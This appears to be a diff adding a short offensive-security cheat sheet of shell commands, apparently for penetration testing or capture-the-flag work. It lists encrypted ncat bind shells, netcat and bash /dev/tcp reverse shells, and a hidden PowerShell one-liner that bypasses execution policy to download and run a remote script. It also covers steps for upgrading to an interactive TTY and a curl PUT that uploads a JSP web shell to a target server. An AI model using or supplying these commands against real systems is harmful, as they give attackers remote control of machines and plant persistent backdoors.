@@ -1,0 +1,45 @@
+Encrypted Bind Shell on windows
+Ncat
+On Target
+Ncat -e cmd.exe --allow jumpbox_ip --vnlp 4444 --ssl
+On Jumpbox
+Ncat -v target_ip 4444 --ssl
+
+Reverse shell with Powershell
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/csharp.ps1%27)
+
+Encrypted Bind Shell on Linux
+nc -nvlp 4444 -e {/bin/bash | cmd.exe} --ssl
+nc -nv <target-ip> 4444 --ssl
+
+
+Standard reverse shell
+Open up port forwarding if on the internet
+Attacker:
+Nc -nlvp 4444
+Victim:
+Nc attacker_ip 4444 -e /bin/bash
+
+Upgrading Shell & Creating Shell w/o Netcat
+https://delta.navisec.io/reverse-shell-reference/
+bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
+
+Lazy upgrade way, works great on windows
+Sudo apt install rlwrap
+
+Enable interactive shell (tab complete, arrows keys, etc)(ONLY WORKS ON LINUX, use rlwrap in front of listener for windows)
+python -c 'import pty; pty.spawn("/bin/bash")' (be sure to check for python3)
+SHELL=/bin/bash script -q /dev/null (if your machine doesn't have python)
+Ctrl + Z (background the shell)
+echo $TERM && tput lines && tput cols (note this down, it will disappear)
+stty raw -echo; fg
+reset
+https://techtitbits.com/2010/10/resolving-unknown-unknown-terminal-type-error/
+echo $TERM
+export SHELL=bash
+export TERM=xterm-256color - (refer to step 3)
+stty rows 38 columns 116 - (refer to step 3)
+
+Use Curl to put file on server
+Curl -X PUT http://Target_IP:8080/test.jsp -d @- < cmd.jsp
+
